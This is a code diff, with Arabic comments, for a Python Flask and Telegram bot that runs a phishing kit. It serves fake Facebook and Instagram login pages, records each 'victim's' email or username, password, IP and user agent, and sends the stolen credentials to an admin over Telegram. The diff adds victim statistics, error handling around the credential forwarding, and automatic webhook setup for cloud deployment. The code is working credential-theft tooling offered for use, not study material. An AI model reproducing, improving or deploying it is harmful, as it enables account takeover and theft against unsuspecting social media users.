@@ -119,9 +119,14 @@ def start_command(message):
 /create_instagram - إنشاء صفحة انستغرام  
 /victims - عرض الضحايا
 /stats - الإحصائيات
+/test - اختبار البوت
     """
     
     bot.reply_to(message, welcome_text, parse_mode='Markdown')
+
+@bot.message_handler(commands=['test'])
+def test_command(message):
+    bot.reply_to(message, "✅ البوت يعمل بنجاح!")
 
 @bot.message_handler(commands=['create_facebook'])
 def create_facebook_command(message):
@@ -129,7 +134,9 @@ def create_facebook_command(message):
     if str(user_id) != ADMIN_ID:
         return
     
-    page_url = f"{request.host_url}facebook_login"
+    # الحصول على رابط التطبيق من متغير البيئة
+    app_url = os.environ.get('RENDER_EXTERNAL_URL', request.host_url)
+    page_url = f"{app_url}facebook_login"
     save_page("فيسبوك", page_url)
     
     bot.reply_to(message, f"🌐 **صفحة فيسبوك جاهزة:**\n`{page_url}`", parse_mode='Markdown')
@@ -140,7 +147,8 @@ def create_instagram_command(message):
     if str(user_id) != ADMIN_ID:
         return
     
-    page_url = f"{request.host_url}instagram_login"
+    app_url = os.environ.get('RENDER_EXTERNAL_URL', request.host_url)
+    page_url = f"{app_url}instagram_login"
     save_page("انستغرام", page_url)
     
     bot.reply_to(message, f"📸 **صفحة انستغرام جاهزة:**\n`{page_url}`", parse_mode='Markdown')
@@ -152,6 +160,10 @@ def victims_command(message):
         return
     
     victims = get_recent_victims()
+    if not victims:
+        bot.reply_to(message, "📭 لا توجد ضحايا حتى الآن")
+        return
+    
     victims_text = "👥 **آخر 5 ضحايا:**\n\n"
     
     for victim in victims:
@@ -159,10 +171,29 @@ def victims_command(message):
     
     bot.reply_to(message, victims_text, parse_mode='Markdown')
 
+@bot.message_handler(commands=['stats'])
+def stats_command(message):
+    user_id = message.from_user.id
+    if str(user_id) != ADMIN_ID:
+        return
+    
+    victims_count = get_victims_count()
+    pages_count = get_pages_count()
+    
+    stats_text = f"""
+📊 **إحصائيات البوت:**
+
+🎯 **الضحايا:** {victims_count}
+🌐 **الصفحات النشطة:** {pages_count}
+🟢 **حالة البوت:** نشط
+    """
+    
+    bot.reply_to(message, stats_text, parse_mode='Markdown')
+
 # Routes التصيد
 @app.route('/')
 def home():
-    return "🚀 البوت يعمل بنجاح!"
+    return "🚀 البوت يعمل بنجاح! أرسل /start في التليجرام"
 
 @app.route('/facebook_login')
 def facebook_login():
@@ -182,11 +213,14 @@ def submit_facebook():
     save_victim(email, password, ip, user_agent, "فيسبوك")
     
     # إرسال إشعار للتليجرام
-    bot.send_message(
-        ADMIN_ID,
-        f"🎯 **ضحية جديدة - فيسبوك**\n\n📧 `{email}`\n🔑 `{password}`\n🌐 `{ip}`",
-        parse_mode='Markdown'
-    )
+    try:
+        bot.send_message(
+            ADMIN_ID,
+            f"🎯 **ضحية جديدة - فيسبوك**\n\n📧 `{email}`\n🔑 `{password}`\n🌐 `{ip}`",
+            parse_mode='Markdown'
+        )
+    except Exception as e:
+        logger.error(f"Error sending message: {e}")
     
     return "تم تسجيل الدخول بنجاح! جاري التوجيه..."
 
@@ -199,11 +233,14 @@ def submit_instagram():
     
     save_victim(username, password, ip, user_agent, "انستغرام")
     
-    bot.send_message(
-        ADMIN_ID,
-        f"🎯 **ضحية جديدة - انستغرام**\n\n👤 `{username}`\n🔑 `{password}`\n🌐 `{ip}`",
-        parse_mode='Markdown'
-    )
+    try:
+        bot.send_message(
+            ADMIN_ID,
+            f"🎯 **ضحية جديدة - انستغرام**\n\n👤 `{username}`\n🔑 `{password}`\n🌐 `{ip}`",
+            parse_mode='Markdown'
+        )
+    except Exception as e:
+        logger.error(f"Error sending message: {e}")
     
     return "تم تسجيل الدخول بنجاح! جاري التوجيه..."
 
@@ -217,6 +254,24 @@ def webhook():
     except Exception as e:
         logger.error(f"Webhook error: {e}")
         return 'ERROR'
+
+# إعداد Webhook تلقائياً عند التشغيل
+@app.before_first_request
+def setup_webhook():
+    try:
+        # الحصول على رابط التطبيق
+        app_url = os.environ.get('RENDER_EXTERNAL_URL', '')
+        if app_url:
+            webhook_url = f"{app_url}/webhook"
+            bot.remove_webhook()
+            bot.set_webhook(url=webhook_url)
+            logger.info(f"Webhook set to: {webhook_url}")
+        else:
+            # استخدام Polling للتنمية المحلية
+            bot.remove_webhook()
+            logger.info("Webhook removed, using polling")
+    except Exception as e:
+        logger.error(f"Webhook setup error: {e}")
 
 # دوال مساعدة
 def save_victim(email, password, ip, user_agent, page):
